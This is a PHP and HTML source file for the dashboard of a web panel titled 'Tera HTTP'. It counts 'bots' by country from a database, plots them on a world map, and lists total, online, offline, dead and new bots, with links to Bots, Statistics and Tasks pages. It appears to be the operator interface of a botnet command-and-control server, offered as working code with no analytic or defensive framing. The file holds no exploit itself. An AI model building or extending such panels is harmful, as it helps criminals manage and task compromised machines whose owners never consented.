<?php
include("../inc/botstats.php");
include '../inc/geo/geoip.inc';
$gi = geoip_open("../inc/geo/GeoIP.dat", "");

$csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt ");
$rows = array();
$rows2 = array();
 while ($c = $csel->fetch())
									{
                    $top2 = geoip_country_code_by_id($gi, $c[0]);
                    $top = number_format($c[1]);
									  $uncap = strtolower($top2);
                   
                    $rows[] = $uncap;
                    $rows2[] = $top;
                    
									
  }

$c = array_combine($rows, $rows2);
$final = json_encode($c);

?>
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>Tera HTTP</title>

  <!-- Bootstrap Core CSS -->
  <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

  <!-- MetisMenu CSS -->
  <link href="../vendor/metisMenu/metisMenu.min.css" rel="stylesheet">

  <!-- Custom CSS -->
  <link href="../dist/css/sb-admin-2.css" rel="stylesheet">

  <!-- Morris Charts CSS -->
  <link href="../vendor/morrisjs/morris.css" rel="stylesheet">
    <link href="../dist/jqvmap.css" media="screen" rel="stylesheet" type="text/css"/>

    <script type="text/javascript" src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="../js/jquery.vmap.js"></script>
    <script type="text/javascript" src="../js/jquery.vmap.world.js" charset="utf-8"></script>
    <script type="text/javascript" src="../js/jquery.vmap.sampledata.js"></script>
<script type="text/javascript">
      var gdpData = <?php echo($final);?>;
    </script>
    <script>
      
      jQuery(document).ready(function () {
        jQuery('#vmap').vectorMap({
          map: 'world_en',
          backgroundColor: '#333333',
          color: '#ffffff',
          hoverOpacity: 0.7,
          selectedColor: '#666666',
          enableZoom: true,
          showTooltip: true,
          scaleColors: ['#C8EEFF', '#006491'],
          values: gdpData,
          normalizeFunction: 'polynomial',
          onLabelShow: function (event, label, code) {
    if(gdpData[code] > 0)
        label.append(': '+gdpData[code]+' Bots'); 
}
                                  
        });
      });
    </script>
</head>

<body>

  <div id="wrapper">

    <!-- Navigation -->
    <nav class="navbar navbar-default navbar-static-top" role="navigation" style="margin-bottom: 0">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
        <a class="navbar-brand" href="index.html">Tera HTTP</a>
      </div>
      <!-- /.navbar-header -->

      <ul class="nav navbar-top-links navbar-right">

        <!-- /.dropdown -->
        <li class="dropdown">
          <a class="dropdown-toggle" data-toggle="dropdown" href="#">
                        <i class="fa fa-user fa-fw"></i> <i class="fa fa-caret-down"></i>
                    </a>
          <ul class="dropdown-menu dropdown-user">
            <li><a href="settings.php"><i class="fa fa-gear fa-fw"></i> Settings</a>
            </li>
            <li class="divider"></li>
            <li><a href="logout.php"><i class="fa fa-sign-out fa-fw"></i> Logout</a>
            </li>
          </ul>
          <!-- /.dropdown-user -->
        </li>
        <!-- /.dropdown -->
      </ul>
      <!-- /.navbar-top-links -->

      <div class="navbar-default sidebar" role="navigation">
        <div class="sidebar-nav navbar-collapse">
          <ul class="nav" id="side-menu">
            <li class="sidebar-search">
              <div class="input-group custom-search-form">
                <input type="text" class="form-control" placeholder="Search...">
                <span class="input-group-btn">
                                <button class="btn btn-default" type="button">
                                    <i class="fa fa-search"></i>
                                </button>
                            </span>
              </div>
              <!-- /input-group -->
            </li>
             <li>
              <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
            </li>

            </li>
            <li>
              <a href="bots.php"><i class="fa fa-table fa-fw"></i> Bots</a>
            </li>
            <li>
              <a href="statistics.php"><i class="fa fa-th-list"></i> Statistics</a>
            </li>
            <li>
              <a href="tasks.php"><i class="fa fa-edit fa-fw"></i> Tasks </a>
            </li>
             <li>
              <a href="settings.php"><i class="fa fa-gears"></i> Settings </a>
            </li>


            <!-- /.nav-second-level -->
            </li>

          </ul>
        </div>
        <!-- /.sidebar-collapse -->
      </div>
      <!-- /.navbar-static-side -->
    </nav>

    <div id="page-wrapper">
      <div class="row">
        <div class="col-lg-12">
          <h1 class="page-header">Dashboard</h1>
        </div>
        <!-- /.col-lg-12 -->
      </div>
      <!-- /.row -->
      
      <div class="row">
        <div class="col-lg-3 col-md-6">
          <div class="panel panel-primary">
            <div class="panel-heading">
              <div class="row">
                <div class="col-xs-3">
                  <i class=""></i>
                </div>
                <div class="col-xs-9 text-right">
                  <div class="huge">
                    <center>
                      <?php echo($numtotal);?>
                    </center>
                  </div>
                  <div>
                    <center>Total Bots</center>
                  </div>
                </div>
              </div>
            </div>
            <a href="bots.php">
              <div class="panel-footer">
                <span class="pull-left">View Bots</span>
                <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                <div class="clearfix"></div>
              </div>
            </a>
          </div>
        </div>
        <div class="col-lg-3 col-md-6">
          <div class="panel panel-green">
            <div class="panel-heading">
              <div class="row">
                <div class="col-xs-3">
                  <i class=""></i>
                </div>
                <div class="col-xs-9 text-right">
                  <div class="huge">
                    <center>
                      <?php echo($numonline);?>
                    </center>
                  </div>
                  <div>
                    <center>Online Bots</center>
                  </div>
                </div>
              </div>
            </div>

          </div>
        </div>
        <div class="col-lg-3 col-md-6">
          <div class="panel panel-yellow">
            <div class="panel-heading">
              <div class="row">
                <div class="col-xs-3">
                  <i class=""></i>
                </div>
                <div class="col-xs-9 text-right">
                  <div class="huge">
                    <center>
                      <?php echo($numoffline);?>
                    </center>
                  </div>
                  <div>
                    <center>Offline Bots</center>
                  </div>
                </div>
              </div>
            </div>

          </div>
        </div>
        <div class="col-lg-3 col-md-6">
          <div class="panel panel-red">
            <div class="panel-heading">
              <div class="row">
                <div class="col-xs-3">
                  <i class=""></i>
                </div>
                <div class="col-xs-9 text-right">
                  <div class="huge">
                    <center>
                      <?php echo($numdead);?>
                    </center>
                  </div>
                  <div>
                    <center>Dead Bots</center>
                  </div>
                </div>
              </div>
            </div>

          </div>
        </div>
      </div>
      <!-- /.row -->

      <!-- /.panel-heading -->

      <!-- /.col-lg-8 -->
      <div class="col-lg-4">
        <div class="panel panel-default">
          <div class="panel-heading">
            <i class="fa fa-bell fa-fw"></i> Bots Panel
          </div>
          <!-- /.panel-heading -->
          <div class="panel-body">
            <div class="list-group">
              <a href="#" class="list-group-item">
                                    <i class=""></i> Total Bots
                                    <span class="pull-right text-muted small"><em><?php echo($numtotal);?></em>
                                    </span>
                                </a>
              <a href="#" class="list-group-item">
                                    <i class=""></i> Online Bots
                                    <span class="pull-right text-muted small"><em><?php echo($numonline);?></em>
                                    </span>
                                </a>
              <a href="#" class="list-group-item">
                                    <i class=""></i> Offline Bots
                                    <span class="pull-right text-muted small"><em><?php echo($numoffline);?></em>
                                    </span>
                                </a>
              <a href="#" class="list-group-item">
                                    <i class=""></i> Dead Bots
                                    <span class="pull-right text-muted small"><em><?php echo($numdead);?></em>
                                    </span>
                                </a>
              <a href="#" class="list-group-item">
                                    <i class=""></i> Online/Offline (%)
                                    <span class="pull-right text-muted small"><em><?php echo($onlineofflinefinal);?> %</em>
                                    </span>
                                </a>
              <a href="#" class="list-group-item">
                                    <i class=""></i> New Bots (24 hours):
                                    <span class="pull-right text-muted small"><em><?php echo($new24);?></em>
                                    </span>
                                </a>
              <a href="#" class="list-group-item">
                                    <i class=""></i> New Bots (7 days)
                                    <span class="pull-right text-muted small"><em><?php echo($new7day);?></em>
                                    </span>
                                </a>

            </div>
            <!-- /.list-group -->

          </div>
          <style>
            .wrap{
    text-align:center
}
.left{
    float: left;
    background:grey
}
.right{
    position: fixed;
    top: 320px;
    left: 900px;
}
.center{
 
    background:green;
    margin:0 auto;
   display:inline-block
}
          </style>
          <div class="wrap">
  <div class="right">
    <div class="panel panel-default">
      <div class="panel-heading">
            <i class="fa fa-bell fa-fw"></i> World Map
          </div>
      <div class="panel-body">
          <iframe style="width: 650px; height: 440px;" frameborder=0 src="testtable.php"></iframe>
            </div>
          </div>
            </div>
          </div>
          <!-- /.panel-body -->
        </div>
        <!-- /.panel -->

        
        <!-- /.panel .chat-panel -->
      </div>
      <!-- /.col-lg-4 -->
    </div>
    <!-- /.row -->
  </div>

  <!-- /#page-wrapper -->

  </div>
  <!-- /#wrapper -->

  <!-- jQuery -->
  <script src="../vendor/jquery/jquery.min.js"></script>

  <!-- Bootstrap Core JavaScript -->
  <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>

  <!-- Metis Menu Plugin JavaScript -->
  <script src="../vendor/metisMenu/metisMenu.min.js"></script>

  <!-- Morris Charts JavaScript -->
  <script src="../vendor/raphael/raphael.min.js"></script>
  <script src="../vendor/morrisjs/morris.min.js"></script>
  <script src="../data/morris-data.js"></script>

  <!-- Custom Theme JavaScript -->
  <script src="../dist/js/sb-admin-2.js"></script>

</body>

</html>